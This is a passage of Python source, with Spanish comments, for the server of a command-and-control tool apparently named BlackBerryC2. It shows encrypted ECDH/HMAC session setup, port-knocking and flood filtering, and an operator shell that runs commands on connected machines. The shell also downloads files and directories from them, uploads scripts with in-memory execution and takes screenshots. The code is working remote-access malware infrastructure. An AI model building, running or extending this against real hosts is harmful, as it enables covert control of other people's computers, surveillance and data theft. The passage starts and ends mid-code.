                        _hs = (_host[:17] + "…") if len(_host) > 18 else _host
                        _fs = (_file[:25] + "…") if len(_file) > 26 else _file

                        _row = (
                            f"  {_ts:<19}  {_op:<3}  {_st:<4}  "
                            f"{_ip_r:<15}  {_hs:<18}  {_fs:<26}  "
                            f"{_fmtb(_sz)}  {_fmtspd(_spd)}  "
                            f"{_fmtela(_ela)}  {_note}"
                        )

                        if   _st == "OK"   and _op == "PUT": print(f"{B_GREEN}{_row}{RESET}")
                        elif _st == "OK"   and _op == "GET": print(f"{B_CYAN}{_row}{RESET}")
                        elif _st in ("DENY", "CANC"):        print(f"{RED}{_row}{RESET}")
                        elif _st in ("FAIL", "404"):         print(f"{YELLOW}{_row}{RESET}")
                        else:                                print(_row)

                    print(f"{B_CYAN}{'═'*_W}{RESET}\n")

                # auto [on|off]
                elif cmd == "auto":
                    if rest:
                        sub = rest[0].lower()
                        if sub in ('on', 'si', 'yes', '1'):
                            BT_AUTO_CONFIRM = True
                        elif sub in ('off', 'no', '0'):
                            BT_AUTO_CONFIRM = False
                        else:
                            print(f"{YELLOW}  Uso: auto [on|off]{RESET}")
                            continue
                    else:
                        BT_AUTO_CONFIRM = not BT_AUTO_CONFIRM

                    state = f"{GREEN}ACTIVADO{RESET}" if BT_AUTO_CONFIRM else f"{YELLOW}DESACTIVADO{RESET}"
                    print(f"  Auto-confirm: {state}")
                    if BT_AUTO_CONFIRM:
                        with bt_pending_lock:
                            pending_items = list(bt_pending_confirms.items())
                        if pending_items:
                            for did, entry in pending_items:
                                entry["approved"] = True
                                entry["event"].set()
                                print(f"  {GREEN}✓ {did} aprobado: {entry['filename']}{RESET}")

                # exit
                elif cmd in ("exit", "quit", "q"):
                    print(f"\n{B_YELLOW}[BerryTransfer] Deteniendo...{RESET}")
                    with bt_pending_lock:
                        for entry in bt_pending_confirms.values():
                            entry["approved"] = False
                            entry["event"].set()
                    with conn_lock:
                        for _, sess in list(connections.items()):
                            try: sess.socket.close()
                            except Exception: pass
                        connections.clear()
                    with server_socket_lock:
                        if server_socket:
                            try: server_socket.close()
                            except Exception: pass
                    print(f"{B_GREEN}[BerryTransfer] hasta luego :){RESET}")
                    sys.exit(0)

                else:
                    print(f"  {YELLOW}Comando desconocido. Escribe 'help' para ver los comandos.{RESET}")

            except Exception as e:
                logging.exception(f"[bt_interactive_shell] Error: {e}")
                print(f"{RED}[!] Error: {e}{RESET}")

    # Ejecutar el loop dentro de patch_stdout si prompt_toolkit está disponible.
    # patch_stdout hace que cualquier print() de OTROS HILOS (bt_server_session)
    # aparezca correctamente encima del prompt, sin corromper los colores ANSI.
    if PROMPT_TOOLKIT_AVAILABLE and bt_prompt_session and _pt_patch_stdout:
        # raw=True: preserva secuencias ANSI de los prints de hilos de background.
        # Sin raw=True, prompt_toolkit corrompe los códigos \033[ → '?['.
        try:
            with _pt_patch_stdout(raw=True):
                _run_shell_loop()
        except TypeError:
            # Versiones antiguas de prompt_toolkit no aceptan raw=
            with _pt_patch_stdout():
                _run_shell_loop()
    else:
        _run_shell_loop()


def accept_connections(sock):
    """Acepta conexiones entrantes con timeout configurado."""
    global conn_id_counter
    while True:
        try:
            with server_socket_lock:
                if sock != server_socket:
                    logging.info("Socket de aceptación obsoleto, terminando hilo...")
                    return
                    
            client_socket, address = sock.accept()
            ip, port = address
            now = time.time()

            with behavior_lock:
                connection_behavior[ip]['timestamps'].append(now)

            if is_ip_blocked(ip):
                log_rejection_smart(ip, "bloqueo permanente")
                try:
                    client_socket.close()
                except Exception as e:
                    logging.debug(f"Error cerrando socket bloqueado: {e}")
                continue

            if is_ip_temp_banned(ip):
                log_rejection_smart(ip, "bloqueo temporal")
                try:
                    client_socket.close()
                except Exception as e:
                    logging.debug(f"Error cerrando socket temp-banned: {e}")
                continue

            if not is_ip_allowed(ip):
                log_rejection_smart(ip, "anti-flood")
                try:
                    client_socket.close()
                except Exception as e:
                    logging.debug(f"Error cerrando socket anti-flood: {e}")
                continue

            # ── SPA / PORT-KNOCKING ─────────────────────────────────────────
            if SPA_ENABLED and not spa_is_authorized(ip):
                log_rejection_smart(ip, "SPA no completado")
                logging.warning(f"[SPA] Conexión TCP rechazada de {ip} — no autenticado via SPA")
                try:
                    # Sin banner, sin respuesta: silencio total
                    client_socket.close()
                except Exception:
                    pass
                continue
            # ───────────────────────────────────────────────────────────────

            check_suspicious_behavior(ip)

            client_socket.settimeout(30)
            logging.info("Nueva conexión: %s:%s — banner enviado, esperando REQUEST_PUBKEY", ip, port)

            service_banner = f"{SERVICE_BANNER}\r\n".encode('utf-8')
            client_socket.sendall(service_banner)

            try:
                request = client_socket.recv(1024)
            except socket.timeout:
                logging.warning(f"Timeout esperando REQUEST_PUBKEY de {ip}:{port}")
                with behavior_lock:
                    connection_behavior[ip]['failed_handshakes'] += 1
                try:
                    client_socket.close()
                except Exception as e:
                    logging.debug(f"Error cerrando socket timeout: {e}")
                check_suspicious_behavior(ip)
                continue
            except Exception as e:
                logging.exception(f"Error recibiendo REQUEST_PUBKEY de {ip}:{port}: {e}")
                try:
                    client_socket.close()
                except:
                    pass
                continue
            
            if not request:
                with behavior_lock:
                    connection_behavior[ip]['banner_grabs'] += 1
                logging.info("Cliente %s:%s se desconectó tras recibir el banner (banner grab).", ip, port)
                try:
                    client_socket.close()
                except Exception as e:
                    logging.debug(f"Error cerrando socket banner grab: {e}")
                check_suspicious_behavior(ip)
                continue

            request_str = request.decode('utf-8', errors='ignore').strip()
            if request_str != "REQUEST_PUBKEY":
                with behavior_lock:
                    connection_behavior[ip]['failed_handshakes'] += 1
                logging.warning("Cliente %s:%s envió solicitud inesperada: %s", ip, port, request_str)
                try:
                    client_socket.sendall(b"ERROR: Invalid request\r\n")
                except Exception as e:
                    logging.debug(f"Error enviando ERROR: {e}")
                try:
                    client_socket.close()
                except:
                    pass
                check_suspicious_behavior(ip)
                continue

            logging.info("Cliente %s:%s solicitó clave pública. Enviando ECDH...", ip, port)
            try:
                # Generar par ECDH efímero del servidor
                server_ecdh_private = ec.generate_private_key(ec.SECP256R1())
                server_ecdh_public_pem = server_ecdh_private.public_key().public_bytes(
                    serialization.Encoding.PEM,
                    serialization.PublicFormat.SubjectPublicKeyInfo
                )
                # Enviar clave ECDH pública con prefijo ECDH_PUBKEY
                client_socket.sendall(b"ECDH_PUBKEY:" + server_ecdh_public_pem)
                logging.info("Clave ECDH pública enviada a %s:%s", ip, port)
            except Exception as e:
                logging.error("Error enviando clave ECDH a %s:%s: %s", ip, port, e)
                try:
                    client_socket.close()
                except:
                    pass
                check_suspicious_behavior(ip)
                continue

            # Recibir clave pública ECDH del cliente: [4 bytes longitud PEM][PEM][32 bytes HMAC]
            raw_len = recvall(client_socket, 4, 15)
            if not raw_len:
                with behavior_lock:
                    connection_behavior[ip]['failed_handshakes'] += 1
                logging.warning("Handshake incompleto: no se recibió longitud de PEM ECDHE desde %s:%s", ip, port)
                try:
                    client_socket.close()
                except:
                    pass
                check_suspicious_behavior(ip)
                continue

            pem_len = struct.unpack('!I', raw_len)[0]
            if pem_len > 8192 or pem_len < 50:
                logging.warning("Tamaño de PEM ECDHE sospechoso de %s:%s: %d bytes", ip, port, pem_len)
                try:
                    client_socket.close()
                except:
                    pass
                continue

            client_ecdh_pem = recvall(client_socket, pem_len, 15)
            if not client_ecdh_pem or len(client_ecdh_pem) != pem_len:
                with behavior_lock:
                    connection_behavior[ip]['failed_handshakes'] += 1
                logging.error("No se recibió PEM ECDHE completo de %s:%s", ip, port)
                try:
                    client_socket.close()
                except:
                    pass
                check_suspicious_behavior(ip)
                continue

            # Recibir HMAC tag (siempre 32 bytes)
            hmac_tag = recvall(client_socket, 32, 15)
            if not hmac_tag or len(hmac_tag) != 32:
                with behavior_lock:
                    connection_behavior[ip]['failed_handshakes'] += 1
                logging.error("No se recibió HMAC de %s:%s", ip, port)
                try:
                    client_socket.close()
                except:
                    pass
                check_suspicious_behavior(ip)
                continue

            try:
                # Parsear clave pública del cliente
                client_ecdh_public = serialization.load_pem_public_key(client_ecdh_pem)
                
                # Calcular secreto compartido ECDH
                shared_secret = server_ecdh_private.exchange(ec.ECDH(), client_ecdh_public)
                
                # Derivar clave AES-256 con HKDF
                aes_key = HKDF(
                    algorithm=hashes.SHA256(),
                    length=32,
                    salt=None,
                    info=b'BlackBerryC2_AES_KEY',
                ).derive(shared_secret)


                
                # ==================== HMAC VERIFICATION ====================
                if not NO_SECURE_MODE:
                    expected_hmac = hmac_module.new(
                        HMAC_PRE_SHARED_SECRET, shared_secret, hashlib.sha256
                    ).digest()
                    if not hmac_module.compare_digest(hmac_tag, expected_hmac):
                        logging.warning(f"HMAC inválido de {ip}:{port} — cliente NO autenticado, rechazando")
                        raise ValueError("HMAC verification failed - unauthorized client")
                    logging.info(f"Cliente {ip}:{port} — HMAC verificado, cliente auténtico")
                else:
                    logging.info(f"Cliente {ip}:{port} — modo --no-secure, HMAC no verificado")
                
                # Validar tamaño de clave AES derivada
                if not isinstance(aes_key, (bytes, bytearray)):
                    raise ValueError("Formato de clave AES inválido")
                    
                if len(aes_key) < MIN_AES_KEY_SIZE:
                    raise ValueError(f"Clave AES derivada demasiado débil: {len(aes_key)*8} bits")
                
                logging.info(f"Cliente {ip}:{port} - ECDHE completado, AES-{len(aes_key)*8} derivada")
                
                # NOTA: NO enviar b"OK" aquí - los clientes TCP/TLS no lo esperan
                # El proxy HTTP genera su propio "OK" para clientes HTTP/S
                
            except Exception as e:
                with behavior_lock:
                    connection_behavior[ip]['failed_handshakes'] += 1
                logging.exception("Error en handshake ECDHE de %s:%s: %s", ip, port, e)
                try:
                    client_socket.sendall(b"FAIL")
                except:
                    pass
                try:
                    client_socket.close()
                except:
                    pass
                check_suspicious_behavior(ip)
                continue

            with conn_lock:
                cid = conn_id_counter
                session = ClientSession(client_socket, address, aes_key, cid)
                connections[cid] = session
                logging.info("Sesión #%s establecida con %s:%s — handshake completado", conn_id_counter, ip, port)
                conn_id_counter += 1
            _log_session_event("connect", session)
            
            client_socket.settimeout(None)
            
            # ── BerryTransfer mode detection ────────────────────────────────────
            # Si el servidor arrancó con --berrytransfer, esperamos que el cliente
            # envíe BERRY_TRANSFER_MODE. Si no lo hace o el servidor NO está en ese
            # modo pero el cliente lo pide, se maneja adecuadamente.
            if BERRYTRANSFER_MODE:
                # El servidor SOLO acepta clientes BerryTransfer
                try:
                    bt_msg, bt_reason = receive_encrypted_message(
                        client_socket, aes_key, timeout=15, session=session
                    )
                    if bt_msg == "BERRY_TRANSFER_MODE":
                        send_encrypted_message(
                            client_socket, "BERRY_TRANSFER_READY", aes_key,
                            timeout=10, session=session
                        )
                        logging.info(f"[BerryTransfer] #{cid} de {ip} — modo transfer activado")
                        threading.Thread(
                            target=bt_server_session, args=(session,), daemon=True
                        ).start()
                    else:
                        # No es un cliente BerryTransfer, rechazar
                        logging.warning(f"[BerryTransfer] #{cid} de {ip} — "
                                        f"cliente no envió BERRY_TRANSFER_MODE: {bt_msg!r}")
                        try:
                            send_encrypted_message(
                                client_socket, "BERRY_TRANSFER_DENIED", aes_key,
                                timeout=5, session=session
                            )
                        except Exception:
                            pass
                        client_socket.close()
                        with conn_lock:
                            connections.pop(cid, None)
                except Exception as e:
                    logging.debug(f"[BerryTransfer] Error detectando modo en #{cid}: {e}")
                    client_socket.close()
                    with conn_lock:
                        connections.pop(cid, None)
                continue
            # ───────────────────────────────────────────────────────────────────

            threading.Thread(target=handle_client, args=(session,), daemon=True).start()
            
            # Solicitar hostname y capacidades en background
            threading.Thread(target=fetch_hostname_from_client, args=(session,), daemon=True).start()

        except ConnectionResetError:
            ip = address[0] if 'address' in locals() else "unknown"
            with behavior_lock:
                connection_behavior[ip]['failed_handshakes'] += 1
            logging.warning(f"Conexión reseteada por {ip} (posible SYN scan)")
            check_suspicious_behavior(ip)
            
        except OSError as e:
            if "Bad file descriptor" in str(e) or "closed" in str(e).lower():
                logging.info("Socket cerrado, terminando hilo de aceptación...")
                return
            logging.exception("Error en accept_connections: %s", e)
            
        except Exception as e:
            logging.exception("Error al aceptar conexión: %s", e)

def fetch_hostname_from_client(session):
    """Obtiene el hostname y capacidades del cliente en background."""
    try:
        # Obtener hostname
        response = send_command_and_wait_response(session, "GET_HOSTNAME", timeout=5)
        if response and len(response.strip()) > 0:
            session.hostname = response.strip()
            logging.debug(f"Hostname obtenido para sesión {session.session_id}: {session.hostname}")
        
        # Negociar capacidades de compresión
        cap_response = send_command_and_wait_response(session, "GET_CAPABILITIES", timeout=5)
        if cap_response and cap_response.startswith("CAPS:"):
            caps = cap_response.split(":")[1].split(",")
            session.supports_zstd = "zstd" in caps
            session.capabilities_negotiated = True
            logging.debug(f"Capacidades del cliente {session.session_id}: zstd={session.supports_zstd}")
        else:
            # Asumir solo zlib para compatibilidad con clientes antiguos
            session.supports_zstd = False
            session.capabilities_negotiated = True
            logging.debug(f"Cliente {session.session_id} no reportó capacidades, asumiendo solo zlib")
            
    except Exception as e:
        logging.debug(f"Error obteniendo hostname/capacidades: {e}")
        # En caso de error, asumir compatibilidad mínima
        session.supports_zstd = False
        session.capabilities_negotiated = True

def handle_client(session):
    """Maneja la conexión activa con un cliente."""
    cid = session.session_id
    client_socket = session.socket
    aes_key = session.aes_key

    try:
        logging.debug(f"Iniciando manejo del cliente #{cid}")
        consecutive_timeouts = 0
        TIMEOUT_LOG_THRESHOLD = 160
        last_timeout_log = 0

        while True:
            with conn_lock:
                if cid not in connections:
                    logging.info(f"Cliente {cid}: Sesión removida externamente, terminando")
                    break

            # (transfer_hijack ya no se usa — workers usan file_event)
            
            try:
                timeout_for_recv = 161 if not session.is_interactive else 300
                msg, reason = receive_encrypted_message(client_socket, aes_key, timeout=timeout_for_recv, session=session)

                if reason == 'timeout':
                    consecutive_timeouts += 1
                    if consecutive_timeouts >= TIMEOUT_LOG_THRESHOLD and (time.time() - last_timeout_log) > 100:
                        logging.debug(f"Cliente {cid}: {consecutive_timeouts} timeouts seguidos")
                        last_timeout_log = time.time()
                    if not session.is_alive():
                        logging.warning(f"Cliente {cid}: Sin heartbeat, desconectando")
                        break
                    time.sleep(0.01)
                    continue

                consecutive_timeouts = 0

                if reason == 'closed':
                    logging.info(f"Cliente {cid}: peer cerró la conexión")
                    break

                if reason in ('incomplete', 'decrypt_error', 'decompress_error', 'error'):
                    logging.warning(f"Cliente {cid}: Error de protocolo ({reason})")
                    if reason == 'error':
                        break
                    continue

                # ── BerryTransfer guard ───────────────────────────────────────
                # Si el cliente pide modo BerryTransfer pero el servidor no lo tiene
                # activado, rechazarlo limpiamente.
                if msg == "BERRY_TRANSFER_MODE":
                    logging.warning(f"Cliente {cid}: solicitó BERRY_TRANSFER_MODE pero "
                                    f"el servidor no está en modo --berrytransfer")
                    send_encrypted_message(client_socket, "BERRY_TRANSFER_DENIED",
                                           aes_key, timeout=5, session=session)
                    break
                # ─────────────────────────────────────────────────────────────

                if msg == "HEARTBEAT":
                    # ==================== SECURITY: Rate limiting de heartbeats ====================
                    current_time = time.time()
                    time_since_last_heartbeat = current_time - session.last_heartbeat_time
                    
                    if session.last_heartbeat_time > 0 and time_since_last_heartbeat < HEARTBEAT_MIN_INTERVAL:
                        # Heartbeat demasiado rápido - posible flood attack
                        session.heartbeat_violations += 1
                        logging.warning(f"Cliente {cid}: Heartbeat flood detectado - {time_since_last_heartbeat:.2f}s desde último (mínimo {HEARTBEAT_MIN_INTERVAL}s). Violaciones: {session.heartbeat_violations}")
                        
                        # Si hay demasiadas violaciones, desconectar
                        if session.heartbeat_violations > 10:
                            logging.error(f"Cliente {cid}: Demasiadas violaciones de heartbeat rate limit ({session.heartbeat_violations}), desconectando")
                            break
                        
                        # No procesar el heartbeat pero mantener la conexión
                        continue
                    
                    # Heartbeat válido
                    session.last_heartbeat_time = current_time
                    session.update_heartbeat()
                    send_encrypted_message(client_socket, "HEARTBEAT_ACK", aes_key, timeout=5, session=session)
                    logging.debug(f"Cliente {cid}: Heartbeat recibido")
                    continue
                
                # IMPORTANTE: Si estamos recibiendo un directorio recursivo,
                # NO procesar mensajes aquí - dejar que receive_directory_recursive_from_client() los maneje
                if session.receiving_directory:
                    # Durante transferencias recursivas, no aplicar rate limiting tan estricto
                    try:
                        session.response_queue.put(msg, block=False)
                        logging.debug(f"Cliente {cid}: Mensaje durante recepción recursiva almacenado")
                    except:
                        # Si la cola está llena, descartar el mensaje más antiguo
                        try:
                            session.response_queue.get_nowait()
                            session.response_queue.put(msg, block=False)
                            session.messages_dropped += 1
                            logging.warning(f"Cliente {cid}: Cola llena, mensaje descartado (total: {session.messages_dropped})")
                        except:
                            pass
                    continue

                if isinstance(msg, str) and msg.startswith("SIZE "):
                    expected_name = session.expected_file or f"download_{int(time.time())}"
                    session.file_event.clear()
                    # Solo bloquear el prompt si NO es una descarga de background
                    is_bg = session.expected_file_dest is not None
                    if not is_bg:
                        session.pending_transfer = True
                    success = receive_file_stream(session, expected_name, msg, timeout=60)
                    session.file_result = success
                    session.expected_file = None
                    session.pending_transfer = False
                    session.file_event.set()
                    continue

                # Si hay un bg_worker esperando file_event y el cliente manda un ERROR
                # (archivo no encontrado, etc.) hay que desbloquearlo inmediatamente.
                if session.expected_file_dest is not None and isinstance(msg, str) and (
                        msg.startswith("[ERROR]") or msg.startswith("FILE_NOT_FOUND")):
                    session.file_result = False
                    session.file_error  = msg
                    session.expected_file      = None
                    session.expected_file_dest = None
                    session.file_event.set()
                    continue
                
                # Handler para SCREENSHOT_SIZE
                if isinstance(msg, str) and msg.startswith("SCREENSHOT_SIZE "):
                    screenshot_name = f"screenshot_{int(time.time())}"
                    session.file_event.clear()
                    session.pending_transfer = True
                    success = receive_screenshot_stream(session, screenshot_name, msg)
                    session.file_result = success
                    session.expected_file = None
                    session.pending_transfer = False
                    session.file_event.set()
                    continue

                # ==================== FLOOD PROTECTION ====================
                # Verificar rate limiting de comandos
                is_flood, commands_per_second = session.check_command_rate()
                
                if is_flood:
                    logging.warning(f"Cliente {cid}: FLOOD DETECTADO - {commands_per_second:.1f} cmds/s (máx: {MAX_COMMANDS_PER_SECOND}). Violaciones: {session.flood_violations}")
                    
                    # Si hay demasiadas violaciones, desconectar
                    if session.flood_violations >= MAX_FLOOD_VIOLATIONS:
                        logging.error(f"Cliente {cid}: Demasiadas violaciones de flood ({session.flood_violations}), DESCONECTANDO")
                        send_encrypted_message(client_socket, "ERROR: Flood detection - connection terminated", aes_key, timeout=5, session=session)
                        break
                    
                    # Descartar el mensaje y continuar
                    session.messages_dropped += 1
                    logging.warning(f"Cliente {cid}: Mensaje descartado por flood (total descartados: {session.messages_dropped})")
                    continue
                
                # Intentar agregar a la cola sin bloquear
                try:
                    session.response_queue.put(msg, block=False)
                    logging.debug(f"Cliente {cid}: Respuesta almacenada (len={len(msg)} bytes, queue_size={session.response_queue.qsize()})")
                except:
                    # Cola llena - descartar mensaje más antiguo y agregar el nuevo
                    session.messages_dropped += 1
                    try:
                        session.response_queue.get_nowait()  # Remover el más antiguo
                        session.response_queue.put(msg, block=False)
                        logging.warning(f"Cliente {cid}: Cola llena ({MAX_RESPONSE_QUEUE_SIZE}), mensaje antiguo descartado (total: {session.messages_dropped})")
                    except Exception as e:
                        logging.error(f"Cliente {cid}: Error manejando cola llena: {e}")

            except socket.timeout:
                continue
            except Exception as e:
                logging.exception(f"Error en comunicación con cliente {cid}: {e}")
                break

    except Exception as e:
        logging.exception(f"Error en handle_client para cliente {cid}: {e}")

    finally:
        with conn_lock:
            if cid in connections:
                del connections[cid]

        try:
            client_socket.close()
        except Exception as e:
            logging.debug(f"Error cerrando socket de cliente {cid}: {e}")

        logging.info(f"Conexión con cliente {cid} cerrada")
        _log_session_event("disconnect", session,
                           extra={"sent": session.bytes_sent,
                                  "recv": session.bytes_received,
                                  "alive_s": int(time.time() - session.start_time)})

def send_command_and_wait_response(session, command, timeout=COMMAND_TIMEOUT):
    """Envía un comando y espera la respuesta."""
    client_socket = session.socket
    aes_key = session.aes_key
    
    try:
        while not session.response_queue.empty():
            try:
                session.response_queue.get_nowait()
            except Empty:
                break
        
        if not send_encrypted_message(client_socket, command, aes_key, timeout=10, session=session):
            return None
        
        try:
            response = session.response_queue.get(timeout=timeout)
            return response
        except Empty:
            if not is_socket_valid(client_socket):
                return None
            logging.warning(f"Timeout esperando respuesta para: {command}")
            return None
            
    except Exception as e:
        logging.exception(f"Error enviando comando '{command}': {e}")
        return None

import signal

# ==================== CADENA DE COMANDOS ROBUSTA ====================

def parse_command_chain(command_string):
    """
    Parsea una cadena de comandos con soporte para:
    - && (ejecutar siguiente solo si el anterior tuvo éxito)
    - || (ejecutar siguiente solo si el anterior falló)
    - ; (ejecutar siguiente siempre)
    
    Returns: Lista de tuplas (comando, operador_siguiente)
    """
    commands = []
    current_cmd = ""
    i = 0
    
    while i < len(command_string):
        char = command_string[i]
        
        # Detectar operadores
        if i < len(command_string) - 1:
            two_chars = command_string[i:i+2]
            
            if two_chars == '&&':
                if current_cmd.strip():
                    commands.append((current_cmd.strip(), '&&'))
                    current_cmd = ""
                i += 2
                continue
            elif two_chars == '||':
                if current_cmd.strip():
                    commands.append((current_cmd.strip(), '||'))
                    current_cmd = ""
                i += 2
                continue
        
        if char == ';':
            if current_cmd.strip():
                commands.append((current_cmd.strip(), ';'))
                current_cmd = ""
            i += 1
            continue
        
        current_cmd += char
        i += 1
    
    # Agregar último comando
    if current_cmd.strip():
        commands.append((current_cmd.strip(), None))
    
    return commands

def execute_command_chain(session, cid, command_chain):
    """
    Ejecuta una cadena de comandos respetando los operadores lógicos.
    
    Returns: True si la ejecución fue exitosa
    """
    last_success = True
    
    for cmd, operator in command_chain:
        # Verificar si debemos ejecutar según el operador anterior
        should_execute = True
        
        if operator == '&&' and not last_success:
            # && requiere que el comando anterior haya tenido éxito
            print(f"{B_YELLOW}[SKIP] Saltando '{cmd}' (comando anterior falló){RESET}")
            should_execute = False
        elif operator == '||' and last_success:
            # || requiere que el comando anterior haya fallado
            print(f"{B_YELLOW}[SKIP] Saltando '{cmd}' (comando anterior tuvo éxito){RESET}")
            should_execute = False
        
        if not should_execute:
            continue
        
        # Ejecutar comando
        print(f"{B_CYAN}[EXEC] Ejecutando: {cmd}{RESET}")
        
        # Procesar el comando individual
        success = execute_single_command(session, cid, cmd)
        last_success = success
    
    return last_success

def execute_single_command(session, cid, command):
    """
    Ejecuta un comando individual y retorna True si fue exitoso.
    """
    try:
        # Verificar si es un comando especial del servidor
        if command.startswith("!"):
            # Comando local del servidor
            return execute_local_command(command[1:])
        
        # Comandos especiales del servidor
        if command.lower() in ["help", "ayuda"]:
            help_client = f"""
{B_CYAN}Cadena de Comandos:{RESET}
  {B_GREEN}comando1 && comando2{RESET}     -> Ejecuta comando2 solo si comando1 tuvo éxito
  {B_GREEN}comando1 || comando2{RESET}     -> Ejecuta comando2 solo si comando1 falló
  {B_GREEN}comando1 ; comando2{RESET}      -> Ejecuta comando2 siempre
  {B_GREEN}Ejemplo:{RESET} ls && get -r documentos/ && exit

{B_CYAN}Comandos Locales (Servidor):{RESET}
  {B_GREEN}!comando{RESET}                 -> Ejecuta comando en el servidor local
  {B_GREEN}!nano archivo.txt{RESET}        -> Edita archivo localmente con nano
  {B_GREEN}!ls{RESET}                      -> Lista archivos del servidor

{B_CYAN}Transferencia de Archivos:{RESET}
  {B_GREEN}get <archivo|dir> [-r]{RESET}    -> Descarga archivo o directorio (-r).
  {B_GREEN}put <archivo> [-r] [-exc]{RESET} -> Sube archivo o directorio (-r).
                                   -exc ejecuta en memoria (scripts).

"""
            print(help_client)
            return True
        
        if command.lower() == "exit":
            return False
        
        # Comandos GET (descargar del cliente)
        if command.startswith("get "):
            return handle_get_command(session, cid, command)
        
        # Comandos PUT (subir al cliente)
        if command.startswith("put "):
            return handle_put_command(session, cid, command)
        
        # Comando SCREENSHOT
        if command.lower() in ["screenshot", "screen"]:
            return handle_screenshot_command(session, cid)
        
        # Comando regular - enviar al cliente
        response = send_command_and_wait_response(session, command, timeout=COMMAND_TIMEOUT)
        
        if response is None:
            if session.pending_transfer:
                print(f"{B_CYAN}[INFO] Transferencia en progreso...{RESET}")
                return True
            print(f"{B_YELLOW}[!] Timeout - no se recibió respuesta{RESET}")
            return False
        
        print(response)
        
        # Determinar éxito basado en la respuesta
        if "[ERROR]" in response or "[TIMEOUT]" in response:
            return False
        
        return True
        
    except Exception as e:
        logging.exception(f"Error ejecutando comando: {e}")
        print(f"{ALERT} {RED}Error: {e}{RESET}")
        return False

def execute_local_command(command):
    """
    Ejecuta un comando en el servidor local (no en el cliente).
    Soporta comandos interactivos como nano, vim, etc.
    """
    try:
        print(f"{B_CYAN}[LOCAL] Ejecutando localmente: {command}{RESET}")
        
        # Comandos interactivos que necesitan TTY
        interactive_commands = ['nano','vim', 'vi', 'emacs', 'less', 'more', 'top', 'htop']
        
        cmd_name = command.split()[0] if command else ""
        
        if cmd_name in interactive_commands:
            # Ejecutar comando interactivo con TTY completo
            result = subprocess.call(command, shell=True, cwd=CURRENT_WORKING_DIR)
            return result == 0
        else:
            # Ejecutar comando normal
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=60,
                cwd=CURRENT_WORKING_DIR
            )
            
            output = result.stdout + result.stderr
            if output.strip():
                print(output)
            
            return result.returncode == 0
    
    except subprocess.TimeoutExpired:
        print(f"{B_YELLOW}[!] Comando local excedió timeout (60s){RESET}")
        return False
    except Exception as e:
        print(f"{ALERT} {RED}Error ejecutando comando local: {e}{RESET}")
        return False

# Funciones auxiliares para manejar comandos específicos
def handle_get_command(session, cid, command):
    """Maneja el comando GET - Placeholder, implementación completa más abajo"""
    # La implementación completa ya existe en interact_with_client
    # Esta es solo una referencia para la cadena de comandos
    return True

def handle_put_command(session, cid, command):
    """Maneja el comando PUT - Placeholder, implementación completa más abajo"""
    return True

def handle_screenshot_command(session, cid):
    """Maneja el comando SCREENSHOT - Placeholder, implementación completa más abajo"""
    return True

# ==================== FIN CADENA DE COMANDOS ====================

def interact_with_client(cid, session):
    global PROMPT_TOOLKIT_AVAILABLE

    """Interactuar con una sesión cliente."""
    addr = session.address
    hostname = session.get_hostname()
    
    print(f"{B_GREEN}Conectado a sesión #{cid} ({hostname}). Escribe 'exit' para salir.{RESET}")

    try:
        session.set_interactive(True)
    except Exception as e:
        logging.exception(f"Error en set_interactive: {e}")

    orig_sigint = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, lambda s, f: None)

    session_history_file = None
    try:
        session_history_file = tempfile.mktemp(prefix=f'BlackBerryC2session{cid}_', suffix='.txt')
    except Exception as e:
        logging.exception(f"Error creando archivo de historial: {e}")

    prompt_session = None

    if PROMPT_TOOLKIT_AVAILABLE and session_history_file:
        try:
            session_commands = ["exit", "get", "put", "whoami", "pwd", "ls", "cd", "cat"]
            completer = WordCompleter(session_commands, ignore_case=True)
            prompt_session = PromptSession(
                history=FileHistory(session_history_file),
                auto_suggest=AutoSuggestFromHistory(),
                completer=completer,
                complete_while_typing=False
            )
        except Exception as e:
            logging.exception(f"Error configurando prompt_toolkit: {e}")
            PROMPT_TOOLKIT_AVAILABLE = False

    def cleanup_session_history():
        try:
            if session_history_file and os.path.exists(session_history_file):
                os.unlink(session_history_file)
        except Exception as e:
            logging.debug(f"Error limpiando historial de sesión: {e}")

    def is_session_connected(sess):
        try:
            sock = getattr(sess, "socket", None)
            if sock is None:
                return False
            sock.getpeername()
            return True
        except Exception:
            return False

    # CWD y usuario cacheados para usar durante transferencias de background
    _cached_cwd  = None
    _cached_user = None

    try:
        while True:
            if not is_session_connected(session):
                print(f"\n{ALERT} {RED}Conexión perdida con la sesión #{cid}. Saliendo...{RESET}")
                break

            # ── ¿Hay transferencias BG activas en esta sesión? ─────────────
            bg_active = any(x.status == "running" and x.session_cid == cid
                           for x in bg_all())

            try:
                if bg_active and _cached_cwd:
                    # Durante BG transfer: no molestar al socket con GET_CWD/whoami
                    # Usar valores cacheados para el prompt
                    current_dir  = _cached_cwd
                    remote_user  = _cached_user or "unknown"
                else:
                    current_dir = send_command_and_wait_response(session, "GET_CWD", timeout=15)
                    if current_dir is None:
                        if session.pending_transfer:
                            print(f"{B_CYAN}[INFO] Transferencia en progreso, esperando...{RESET}")
                            time.sleep(1)
                            continue
                        if not is_session_connected(session):
                            print(f"\n{ALERT} {RED}Conexión perdida. Saliendo...{RESET}")
                            break
                        current_dir = _cached_cwd or "[Timeout]"
                    else:
                        _cached_cwd = current_dir
                        session.last_cwd = current_dir  # actualizar en sesión para list

                    remote_user = send_command_and_wait_response(session, "whoami", timeout=10)
                    if remote_user is None:
                        if session.pending_transfer:
                            continue
                        remote_user = _cached_user or "unknown"
                    else:
                        _cached_user = remote_user

                # Usar hostname en prompt
                prompt_text = f"{cid} {remote_user}@{hostname}~[{current_dir}] >> "
                
                try:
                    if PROMPT_TOOLKIT_AVAILABLE and 'prompt_session' in locals():
                        command = prompt_session.prompt(prompt_text).strip()
                    else:
                        command = input(prompt_text).strip()
                except KeyboardInterrupt:
                    print(f"\n{YELLOW}Usa 'exit' para salir de la sesión interactiva.{RESET}")
                    continue
                except EOFError:
                    break
                except Exception as e:
                    logging.exception(f"Error leyendo input: {e}")
                    break

                if command == "":
                    continue

                # ==================== PROCESAR CADENA DE COMANDOS ====================
                
                # Verificar si es una cadena de comandos (contiene &&, ||, o ;)
                if '&&' in command or '||' in command or ';' in command:
                    print(f"{B_CYAN}[INFO] cadena de comandos{RESET}")
                    command_chain = parse_command_chain(command)
                    execute_command_chain(session, cid, command_chain)
                    continue
                
                # Verificar si es un comando local (empieza con !)
                if command.startswith("!"):
                    execute_local_command(command[1:])
                    continue

                if command in ["help", "ayuda"]:
                    help_client = f"""
